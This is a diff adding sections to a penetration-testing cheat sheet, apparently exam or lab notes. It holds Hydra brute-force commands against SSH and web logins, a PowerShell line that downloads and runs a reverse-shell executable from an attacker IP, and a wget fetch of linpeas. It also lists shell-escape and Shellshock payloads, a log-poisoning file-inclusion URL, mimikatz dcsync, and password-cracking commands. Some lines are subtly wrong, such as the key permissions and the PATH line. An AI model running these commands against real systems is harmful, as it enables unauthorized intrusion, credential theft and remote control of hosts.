@@ -638,11 +638,90 @@
 	
 ## Low Privilege Exploitation
 
+### Hydra
+	```
+	hydra -V -f -l USER -P /usr/share/wordlists/rockyou.txt ssh://IP:22/
+	hydra -V -f -L USERLIST -P /usr/share/wordlists/rockyou.txt ssh://IP:22/
+	hydra -f -l USER -P /usr/share/wordlists/rockyou.txt IP http-post-form "/Intellect/Login.aspx:Username=^USER^&Password=^PASS^:The username or password you entered is incorrect"
+	hydra -f -L /usr/share/wordlists/metasploit/namelist.txt -P /usr/share/wordlists/rockyou.txt IP http-post-form "/Intellect/Login.aspx:Username=^USER^&Password=^PASS^:The username or password you entered is incorrect"
+	```
+
+### Searchsploit
+	```
+	searchsploit EXPLOIT
+	searchsploit -m NUMBER_EXPLOIT
+	```
+
 ## System Enumeration
 
+### PEASS-ng
+	```
+	cd PEASS-ng/linpeas (or winpeas)
+	sudo python -m http.server
+	wget http://KALI_IP:8000/linpeas.sh (or winpeas.exe or winpeas.bat
+	```
+### Windows
+Do not forget if availabe: ``` powershell -ep bypass ```
+
+1. Download file on Windows
+	```
+	powershell -c "Invoke-WebRequest -URI 'http://10.9.5.12:8000/revshell.exe' -OutFile 'c:\windows\temp\revshell.exe'"
+	*execute file*
+	```
+2. Execute file
+	```
+	.\shell.exe
+	```
+
 ## High Privilege Exploitation
+
+### Sudo
+
+	```
+	sudo -l
+	```
+
+### SUID
+
+	```
+	find / -user root -perm -4000 -print 2>/dev/null
+	find / -perm -u=s -type f 2>/dev/null
+	find / -user root -perm -4000 -exec ls -ldb {} \;ls -
+	```
+	
+### Escaping restricted shell
+
+	```
+	ssh USER@IP -t "bash --noprofile"
+	ssh username@IP -t “/bin/sh” or “/bin/bash”
+	ssh username@IP -t “() { :; }; /bin/bash” (Shellshock)
+	```
+	
+### ID_RSA SSH login
+	```
+	chmod 666 key
+	ssh -i key USER@IP
+	```
+
+### Dirty cow (fix to work)
+	```
+	PATH=PATH$:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/lib/gcc/x86_64-linux-gnu/4.8/;export PATH
+	```
+	
+### Log poisoning
+	```
+	http://IP:PORT/index.php?book=../../../../var/log/apache2/access.log&cmd=whoami
+	```
 	
 ## Post Exploitation
+
+### New Host Discover
+	```
+	netdiscover
+	ip a
+	ip neigh
+	hosts
+	```
 
 ### Port Forwarding
 Do not forget to to check /root/port_forwarding_and_tunneling/ssh_renote_port_forwarding.sh
@@ -993,7 +1072,6 @@ Internet traffic on port 80 redirection from Kali to Victim
 		Shell (Str)
 	End Sub
 	
-	nc.exe -lvnp 4444
 	```
 	
 **Active Direcotry Persistence**
@@ -1016,4 +1094,18 @@ Internet traffic on port 80 redirection from Kali to Victim
 2. Domain Controller Synchronization
 	```
 	lsadump::dcsync /user:Administrator
+	```
+
+## Other tools
+1. John ZIP
+	```
+	zip2john zip.zip > zip.hash
+	john --wordlist=/usr/share/wordlists/rockyou.txt zip.hash
+	unzip zip.zip
+	password
+	```
+2. Hashcat ([modes](https://hashcat.net/wiki/doku.php?id=example_hashes)) 
+	```
+	hashcat -m MODE hash.txt /usr/share/wordlists/rockyou.txt -w 4
+	hashcat -m MODE hash.txt /usr/share/wordlists/rockyou.txt -w 4 --show
 	```
